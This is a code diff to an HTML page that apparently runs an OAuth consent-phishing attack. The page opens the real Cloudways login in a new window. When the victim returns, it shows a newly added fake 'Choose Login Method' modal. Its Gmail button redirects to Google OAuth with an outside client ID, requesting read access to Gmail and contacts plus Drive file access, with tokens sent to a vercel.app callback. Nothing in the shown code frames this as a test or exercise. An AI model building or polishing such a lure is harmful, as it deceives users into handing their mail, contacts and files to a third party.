@@ -15,10 +15,63 @@
             z-index: 100;
             display: none;
         }
+        
+        #loginModal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            z-index: 1000;
+            display: none;
+            min-width: 300px;
+            text-align: center;
+        }
+        
+        #loginModal h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        
+        .login-option {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        
+        .login-option:hover {
+            background: #357ae8;
+        }
+        
+        .login-option.secondary {
+            background: #db4437;
+        }
+        
+        .login-option.secondary:hover {
+            background: #c23321;
+        }
     </style>
 </head>
 <body>
     <div id="blackdiv"></div>
+    
+    <!-- Intermediate Login Modal -->
+    <div id="loginModal">
+        <h2>Choose Login Method</h2>
+        <button class="login-option" onclick="proceedWithGmail()">Continue with Gmail</button>
+        <button class="login-option secondary" onclick="proceedWithOtherMethod()">Other Login Method</button>
+        <button class="login-option" onclick="closeLoginModal()" style="background: #666;">Cancel</button>
+    </div>
 
     <a href="#" onclick="launch()">Click Here</a>
 
@@ -30,6 +83,7 @@
 
         var loadedOnce = false;
         var launched = false;
+        var showingModal = false;
 
         function switcher() {
             console.log('Switcher called - loadedOnce:', loadedOnce, 'launched:', launched);
@@ -37,10 +91,9 @@
                 loadedOnce = true;
                 console.log('First time loading iframe');
             } else {
-                if (launched) {
-                    console.log('Second time + launched = true, redirecting...');
-                    top.focus();
-                    top.location = "https://accounts.google.com/o/oauth2/v2/auth?client_id=543860528585-3f07qjeil7o5n9gebdlid4op3cg40hn3.apps.googleusercontent.com&redirect_uri=https://callback-plum.vercel.app/callback.html&response_type=token&scope=openid%20email%20profile%20https://www.googleapis.com/auth/drive.file%20https://www.googleapis.com/auth/gmail.readonly%20https://www.googleapis.com/auth/contacts.readonly&include_granted_scopes=true&state=logged_test_oauth";
+                if (launched && !showingModal) {
+                    console.log('Second time + launched = true, showing login modal...');
+                    showLoginModal();
                 }
             }
         }
@@ -49,6 +102,38 @@
             launched = true;
             console.log('Opening site...');
             loginWindow = window.open("https://unified.cloudways.com/login?ref_id=web_navbar", "login");
+        }
+        
+        function showLoginModal() {
+            showingModal = true;
+            document.getElementById('blackdiv').style.display = 'block';
+            document.getElementById('loginModal').style.display = 'block';
+        }
+        
+        function closeLoginModal() {
+            showingModal = false;
+            document.getElementById('blackdiv').style.display = 'none';
+            document.getElementById('loginModal').style.display = 'none';
+        }
+        
+        function proceedWithGmail() {
+            console.log('User selected Gmail login, redirecting to OAuth...');
+            closeLoginModal();
+            
+            // Add a small delay to ensure modal closes smoothly
+            setTimeout(() => {
+                top.focus();
+                top.location = "https://accounts.google.com/o/oauth2/v2/auth?client_id=543860528585-3f07qjeil7o5n9gebdlid4op3cg40hn3.apps.googleusercontent.com&redirect_uri=https://callback-plum.vercel.app/callback.html&response_type=token&scope=openid%20email%20profile%20https://www.googleapis.com/auth/drive.file%20https://www.googleapis.com/auth/gmail.readonly%20https://www.googleapis.com/auth/contacts.readonly&include_granted_scopes=true&state=logged_test_oauth";
+            }, 300);
+        }
+        
+        function proceedWithOtherMethod() {
+            console.log('User selected other login method');
+            closeLoginModal();
+            
+            // Add your alternative login logic here
+            // For example, redirect to a different OAuth provider or show a different form
+            alert('Other login methods coming soon!');
         }
     </script>
 </body>
